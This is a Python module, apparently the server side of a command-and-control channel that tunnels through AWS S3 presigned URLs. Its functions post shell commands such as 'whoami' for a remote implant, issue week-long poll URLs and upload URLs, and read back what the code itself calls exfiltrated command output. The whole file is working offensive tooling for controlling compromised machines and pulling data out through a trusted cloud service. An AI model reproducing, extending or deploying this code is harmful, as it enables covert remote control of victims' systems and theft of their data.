"""S3 Protocol Functions - Pure functions for S3 presigned URL C2 channel."""

import json
import time
from typing import Optional

import boto3
from botocore.client import BaseClient
from botocore.exceptions import ClientError


def _s3_client(region: str = "us-east-1") -> BaseClient:
    return boto3.client("s3", region_name=region)


def generate_poll_url(
    bucket: str,
    session_id: str,
    expiry_seconds: int = 604800,
    region: str = "us-east-1",
) -> str:
    """Generate a presigned GET URL for the session's command object."""
    client = _s3_client(region)
    return client.generate_presigned_url(
        "get_object",
        Params={"Bucket": bucket, "Key": f"sessions/{session_id}/cmd"},
        ExpiresIn=expiry_seconds,
    )


def generate_response_url(
    bucket: str,
    session_id: str,
    seq: int,
    expiry_seconds: int = 3600,
    region: str = "us-east-1",
) -> str:
    """Generate a presigned PUT URL for uploading command output."""
    client = _s3_client(region)
    return client.generate_presigned_url(
        "put_object",
        Params={
            "Bucket": bucket,
            "Key": f"sessions/{session_id}/out/{seq}",
            "ContentType": "text/plain"
        },
        ExpiresIn=expiry_seconds,
    )


def write_command(
    bucket: str,
    session_id: str,
    seq: int,
    cmd: str,
    response_put_url: str,
    region: str = "us-east-1",
) -> None:
    """
    Write a command JSON object to the session's cmd key in S3.
    Command object format:
      {"seq": 3, "cmd": "whoami", "response_put_url": "https://..."}
    """
    client = _s3_client(region)
    payload = json.dumps(
        {"seq": seq, "cmd": cmd, "response_put_url": response_put_url}
    )
    client.put_object(
        Bucket=bucket,
        Key=f"sessions/{session_id}/cmd",
        Body=payload.encode(),
        ContentType="application/json",
    )


def write_idle(bucket: str, session_id: str, region: str = "us-east-1") -> None:
    """Write idle (null command) state to reset the session."""
    client = _s3_client(region)
    payload = json.dumps({"seq": 0, "cmd": None})
    client.put_object(
        Bucket=bucket,
        Key=f"sessions/{session_id}/cmd",
        Body=payload.encode(),
        ContentType="application/json",
    )


def read_output(
    bucket: str,
    session_id: str,
    seq: int,
    region: str = "us-east-1",
) -> Optional[str]:
    """Read exfiltrated command output from S3. Returns None if not yet available."""
    client = _s3_client(region)
    try:
        resp = client.get_object(
            Bucket=bucket,
            Key=f"sessions/{session_id}/out/{seq}",
        )
        return resp["Body"].read().decode()
    except ClientError as e:
        if e.response["Error"]["Code"] in ("NoSuchKey", "404"):
            return None
        raise


def poll_for_output(
    bucket: str,
    session_id: str,
    seq: int,
    timeout: int = 60,
    interval: int = 2,
    region: str = "us-east-1",
) -> Optional[str]:
    """Poll S3 until output appears at out/{seq} or timeout is reached."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = read_output(bucket, session_id, seq, region)
        if result is not None:
            return result
        time.sleep(interval)
    return None
